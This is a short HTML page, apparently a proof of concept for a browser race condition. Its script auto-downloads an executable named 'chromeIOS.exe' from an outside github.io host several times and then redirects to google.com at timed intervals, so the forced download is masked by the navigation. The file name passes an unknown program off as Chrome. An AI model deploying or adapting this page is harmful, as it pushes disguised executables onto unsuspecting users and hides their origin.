<!doctype html>
<html>
<head>
<meta charset="utf-8">
<style>
.button{
background:#4CAF50;
border:none;
color:white;
padding:15px 32px;
font-size:16px;
cursor:pointer;
}

#log{
font-family:monospace;
margin-top:20px;
}
</style>
</head>

<body>

<center>
<button class="button" onclick="start()">Start Race Test</button>
<div id="log"></div>
</center>

<script>

const file="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";

function start(){

log("Starting race condition test...");

let delays=[50,120,200,280,320,400,500];

delays.forEach((delay,i)=>{

setTimeout(()=>{

log("Attempt redirect delay: "+delay+"ms");

download();

setTimeout(()=>{
window.location.href="https://google.com";
},delay);

},i*1500);

});

}

function download(){

let link=document.createElement("a");
link.href=file;
link.download="chromeIOS.exe";

document.body.appendChild(link);
link.click();
document.body.removeChild(link);

}

function log(msg){
let d=document.createElement("div");
d.textContent=msg;
document.getElementById("log").appendChild(d);
}

</script>

</body>
</html>
